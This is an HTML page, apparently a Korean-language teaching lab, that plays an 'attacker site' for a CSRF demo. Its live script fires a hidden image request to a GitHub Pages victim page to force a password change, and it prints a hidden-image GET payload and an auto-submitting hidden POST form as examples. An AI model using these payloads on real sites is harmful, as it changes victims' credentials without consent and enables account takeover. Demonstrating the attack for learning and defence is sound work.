<!DOCTYPE html>
<html>
<head>
    <title>CSRF 데모: 공격자 사이트</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        .container { max-width: 800px; margin: 0 auto; }
        button { padding: 10px 20px; margin: 20px 0; background-color: #f00; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #c00; }
        pre { background: #f4f4f4; padding: 10px; overflow: auto; }
        .warning { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF 데모: 공격자 사이트</h1>
        <p class="warning">**경고:** 이 페이지는 CSRF 공격의 원리를 시연하기 위한 악성 웹페이지입니다.
           실제 환경에서는 이런 페이지에 접속하면 개인 정보가 탈취되거나 계정 설정이 변경될 수 있습니다!</p>
        
        <h2>공격 시뮬레이션</h2>
        <p>아래 'CSRF 공격 시도!' 버튼을 클릭하면,
           `victim-site.html`에 로그인되어 있는 피해자의 비밀번호를 강제로 변경하는 요청을 보냅니다.</p>
        <p>피해자 사이트의 URL을 GitHub Pages 배포 URL로 변경해주세요!</p>
        
        <button onclick="performCSRFAttack()">CSRF 공격 시도!</button>

        <div id="attackResult"></div>
        
        <hr>
        
        <h2>공격 코드 (예시)</h2>
        <p>내부적으로 사용되는 공격 코드의 예시입니다. 클릭 시 이 코드가 실행되는 것을 시뮬레이션합니다.</p>
        <h3>GET 요청을 이용한 CSRF (일반적인 방식)</h3>
        <pre>&lt;img src="&lt;span class='warning'&gt;[피해자 사이트 URL]&lt;/span&gt;/victim-site.html?action=changePass&new_password=hacked_by_csrf_get" width="1" height="1"&gt;</pre>
        <p>이미지는 사용자에게 보이지 않으면서 해당 URL로 GET 요청을 보냅니다.</p>

        <h3>POST 요청을 이용한 CSRF (자동 제출 폼)</h3>
        <p>POST 요청은 자동으로 제출되는 숨겨진 폼을 통해 이루어질 수 있습니다.</p>
        <pre>
&lt;form id="csrfForm" action="&lt;span class='warning'&gt;[피해자 사이트 URL]&lt;/span&gt;/changePassword" method="POST"&gt;
    &lt;input type="hidden" name="new_password" value="hacked_by_csrf_post"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;
        </pre>
        <p>(이 데모에서는 `POST` 요청에 대한 서버 응답이 없으므로, 위 시뮬레이션 버튼은 GET 요청 방식을 사용합니다.)</p>
        
    </div>

    <script>
        function performCSRFAttack() {
            const attackResult = document.getElementById('attackResult');
            const victimSiteURL = "https://kdg124.github.io/hackinup"; 
            
            // GET 요청을 이용한 CSRF 공격 시뮬레이션
            const img = new Image();
            img.src = victimSiteURL + "/vic_csrf.html?action=changePass&new_password=hacked_by_csrf";
            img.onload = () => {
                attackResult.innerHTML = "<p style='color: red;'>CSRF 공격 요청이 전송되었습니다! 피해자 사이트에서 비밀번호가 변경되었는지 확인하세요.</p>";
            };
            img.onerror = () => {
                attackResult.innerHTML = "<p style='color: orange;'>CSRF 공격 요청 전송 실패 또는 외부 리소스 로딩 불가. (네트워크/CORS 문제일 수 있습니다)</p>";
            };

            // 만약 POST 공격을 시뮬레이션한다면 (별도의 서버 필요)
            // const form = document.createElement('form');
            // form.action = victimSiteURL + "/changePasswordEndpoint"; // 실제 비밀번호 변경 엔드포인트
            // form.method = "POST";
            // form.style.display = "none";
            // const input = document.createElement('input');
            // input.type = "hidden";
            // input.name = "new_password";
            // input.value = "hacked_by_csrf_post";
            // form.appendChild(input);
            // document.body.appendChild(form);
            // form.submit();
        }
    </script>
</body>

</html>

